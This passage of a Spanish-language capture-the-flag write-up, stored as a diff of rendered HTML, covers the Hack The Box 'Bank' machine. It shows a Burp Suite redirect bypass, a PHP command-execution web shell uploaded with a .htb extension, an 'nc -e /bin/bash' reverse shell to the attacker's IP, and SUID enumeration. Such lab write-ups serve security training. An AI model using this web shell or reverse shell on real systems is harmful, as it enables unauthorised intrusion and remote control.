+                        &amp;lt;input &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;inputPassword&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt; required&amp;gt;
+                        &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;action&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                            &amp;lt;input &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;btn btn-primary signup&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt; /&amp;gt;
+                        &amp;lt;/div&amp;gt;
+                      &amp;lt;/form&amp;gt;                 
+                  &amp;lt;/div&amp;gt;
+              &amp;lt;/div&amp;gt;                                                                                                             
+          &amp;lt;/div&amp;gt;                                                
+      &amp;lt;/div&amp;gt;                                                                                                                     
+    &amp;lt;/div&amp;gt;                                                      
+  &amp;lt;/div&amp;gt;
+    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; jQuery &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;necessary &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Bootstrap&lt;span class=&quot;s1&quot;&gt;'s JavaScript plugins) --&amp;gt;
+    &amp;lt;script src=&quot;https://code.jquery.com/jquery.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;!-- Include all compiled plugins (below), or include individual files as needed --&amp;gt;
+    &amp;lt;script src=&quot;./assets/js/js/bootstrap.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+    &amp;lt;script src=&quot;./assets/js/theme/custom.js&quot;&amp;gt;&amp;lt;/script&amp;gt;
+  &amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;#
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://bank.htb/support.php                                                                                            
+                                
+&amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-sm-5&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                          
+    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel panel-primary&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                    &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel-heading&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+            &amp;lt;h3 &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;font-size: 20px;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;My Tickets&amp;lt;/h3&amp;gt;                                                                         
+        &amp;lt;/div&amp;gt;                                                  
+        &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel-body&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                                     &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content-box-large&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                                      &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel-body&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                 
+                            &amp;lt;table &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;table table-bordered&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
+                                &amp;lt;thead&amp;gt;       
+                                    &amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                                                                                         
+                                        &amp;lt;th&amp;gt;#&amp;lt;/th&amp;gt;
+                                        &amp;lt;th&amp;gt;Title&amp;lt;/th&amp;gt;
+                                        &amp;lt;th&amp;gt;Message&amp;lt;/th&amp;gt;                                                                                                                 &amp;lt;th&amp;gt;Attachment&amp;lt;/th&amp;gt;                                                                      
+                                        &amp;lt;th&amp;gt;Actions&amp;lt;/th&amp;gt;
+                                    &amp;lt;/tr&amp;gt;
+                                &amp;lt;/thead&amp;gt;
+                                &amp;lt;tbody&amp;gt;
+                                                                &amp;lt;/tbody&amp;gt;
+                            &amp;lt;/table&amp;gt;
+                        &amp;lt;/div&amp;gt;
+                    &amp;lt;/div&amp;gt;
+                &amp;lt;/div&amp;gt;
+    &amp;lt;/div&amp;gt;                     
+&amp;lt;/div&amp;gt;
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; New Ticket &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-sm-5&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &amp;lt;section &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                                
+        &amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;panel-body&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;                 
+            &amp;lt;form &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;new_ticket&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;new_ticket&quot;&lt;/span&gt; accept-charset&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;enctype&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                                                                
+                &amp;lt;label&amp;gt;Title&amp;lt;/label&amp;gt;                    
+                &amp;lt;input required &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Title&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ticket_title&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;backgr
+ound-repeat: repeat; background-image: none; background-position: 0% 0%;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                &amp;lt;br&amp;gt;                                                                                                             
+                                                                                                                                 
+                &amp;lt;label&amp;gt;Message&amp;lt;/label&amp;gt;                                                                                           
+                &amp;lt;textarea required &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Tell us your problem&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;height: 170px; background-repea
+t: repeat; background-image: none; background-position: 0% 0%;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ticket_message&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/textarea&amp;gt;
+                &amp;lt;br&amp;gt;                                            
+                &amp;lt;div &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;position:relative;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                                &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DEBUG] I added the file extension .htb to execute as php &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;debugging purposes only &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DEBUG] &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                                        &amp;lt;a &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'btn btn-primary'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'javascript:;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                                            Choose File...
+                                            &amp;lt;input &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt; required &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:&quot;progid:DXImageTransform.Microsoft.Alpha(Opacity=0)&quot;;opacity:0;background-color:transparent;color:transparent;'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileToUpload&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;40&quot;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;onchange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'$(&quot;#upload-file-info&quot;).html($(this).val().replace(&quot;C:\\fakepath\\&quot;, &quot;&quot;));'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+                                        &amp;lt;/a&amp;gt;
+                                        &amp;amp;nbsp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+                                        &amp;lt;span &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'label label-info'&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;upload-file-info&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/span&amp;gt;
+                                &amp;lt;/div&amp;gt;
+                                &amp;lt;br&amp;gt;
+                &amp;lt;button &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submitadd&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;btn btn-primary mt20&quot;&lt;/span&gt; data-disable-with&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;div class=&amp;amp;quot;loading-o&amp;amp;quot; style=&amp;amp;quot;padding: 7px 21px;&amp;amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Submit&amp;lt;/button&amp;gt;
+            &amp;lt;/form&amp;gt;
+
+        &amp;lt;/div&amp;gt;
+
+    &amp;lt;/section&amp;gt;
+
+&amp;lt;/div&amp;gt;
+
+        &amp;lt;/div&amp;gt;
+        &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; /#page-wrapper &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+    &amp;lt;/div&amp;gt;
+    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; /#wrapper &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; jQuery &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/jquery.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
+
+    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Bootstrap Core JavaScript &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/bootstrap.min.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
+
+    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Morris Charts JavaScript &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/plugins/morris/raphael.min.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
+    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/plugins/morris/morris.min.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
+    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/plugins/morris/morris-data.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
+
+    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; SweetAlert &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/sweetalert.min.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
+
+&amp;lt;/body&amp;gt;
+
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que las respuestas son diferentes y además, si ponemos ojo de lince, tenemos lo siguiente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&amp;gt;&lt;/code&gt; en la respuesta de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt;. Aquí nos indica que para ejecutar un archivo php debemos de cambiar la extensión a htb. Para poder visualizar el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; sin que nos aplique el &lt;em&gt;redirect&lt;/em&gt; vamos a hacer uso de &lt;strong&gt;&lt;em&gt;Burp Suite&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;En la herramienta vamos a declarar realizar las siguientes configuraciones:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Declarar el scope: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://bank.htb/&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Match and Replace: Cambiar el código de estado &lt;strong&gt;302 Found&lt;/strong&gt; por &lt;strong&gt;200 Ok&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-burp1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con esto y con ayuda del pluggin &lt;strong&gt;Foxy Proxy&lt;/strong&gt; apuntando al &lt;strong&gt;Burp Suite&lt;/strong&gt; vamos a tratar de ingresar al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; sin capturar la petición y nos debería aparecer lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora, vamos a crear un nuevo ticket y subir un archivo &lt;strong&gt;php&lt;/strong&gt; con extensión &lt;strong&gt;htb&lt;/strong&gt; con el cual podamos hacer ejecución de comandos, para este caso lo llamaremos &lt;strong&gt;k4mishell.htb&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Le damos click en &lt;strong&gt;Click Here&lt;/strong&gt; y nos lleva a nuestro archivo bajo el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/uploads&lt;/code&gt; y vemos que podemos ejecutar comandos a nivel de sistema.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a ponernos en escucha por el puerto 443 y vamos a entablarnos una reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://bank.htb/uploads/k4mishell.htb?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nohup &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 10.10.14.27 443 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.29] 42698
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;www-data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para trabajar más comodos vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; y vemos que podemos visualizar la flag (user.txt); por lo tanto vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bank:/home/chris&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+www-data@bank:/home/chris&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 
+www-data@bank:/home/chris&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+www-data@bank:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+./var/htb/bin/emergency
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/policykit-1/polkit-agent-helper-1
